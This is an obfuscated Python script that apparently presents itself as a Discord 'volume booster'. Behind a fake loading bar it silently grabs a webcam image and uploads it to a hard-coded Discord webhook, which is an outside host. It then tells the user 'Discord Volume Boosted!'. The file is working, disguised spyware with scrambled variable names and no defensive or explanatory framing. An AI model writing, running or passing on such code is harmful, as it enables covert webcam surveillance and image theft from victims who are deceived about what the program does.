import cv2 #line:1
import requests #line:2
import numpy as np #line:3
import io #line:4
from colorama import Fore ,Back ,Style ,init #line:5
import time #line:6
init (autoreset =True )#line:8
def show_loading_screen ():#line:10
    print (Fore .GREEN +Back .BLACK +Style .BRIGHT +"Loading... Please wait.")#line:11
    for _O0O000O0O000OOO00 in range (10 ):#line:12
        print (Back .GREEN +' ',end ='')#line:13
        time .sleep (0.1 )#line:14
    print (Style .RESET_ALL )#line:15
def capture_and_send_image ():#line:17
    show_loading_screen ()#line:18
    OO00OOOO00OO0O00O =cv2 .VideoCapture (0 )#line:21
    O00OO0000O000OO0O ,OO00000O00O0000O0 =OO00OOOO00OO0O00O .read ()#line:22
    _OOOO000OOO0O000OO ,O000000OOO0OOO0O0 =cv2 .imencode ('.jpg',OO00000O00O0000O0 )#line:25
    O00OOO0O0OOOOO00O =O000000OOO0OOO0O0 .tobytes ()#line:26
    OOO0O000OO0000O0O =io .BytesIO (O00OOO0O0OOOOO00O )#line:29
    O0O000OOOOO0O0000 ={'file':('image.jpg',OOO0O000OO0000O0O )}#line:32
    OO0O00O0OO00OO0OO ='https://discord.com/api/webhooks/1160771156278788116/63oDbOcnc8Gfg1iWr7_v0zY_nZQl-_H8mu1GZDGsw9Aaw9UjV4-qezVugmdZSSnR5N-B'#line:35
    O0O0OOOOOOOO0OO0O =requests .post (OO0O00O0OO00OO0OO ,files =O0O000OOOOO0O0000 )#line:38
    if O0O0OOOOOOOO0OO0O .status_code ==200 :#line:41
        print (Fore .GREEN +"Discord Volume Boosted!")#line:42
    else :#line:43
        print (Fore .RED +"Error sending image to Discord:",O0O0OOOOOOOO0OO0O .status_code )#line:44
    OO00OOOO00OO0O00O .release ()#line:47
    cv2 .destroyAllWindows ()#line:48
capture_and_send_image ()#line:51
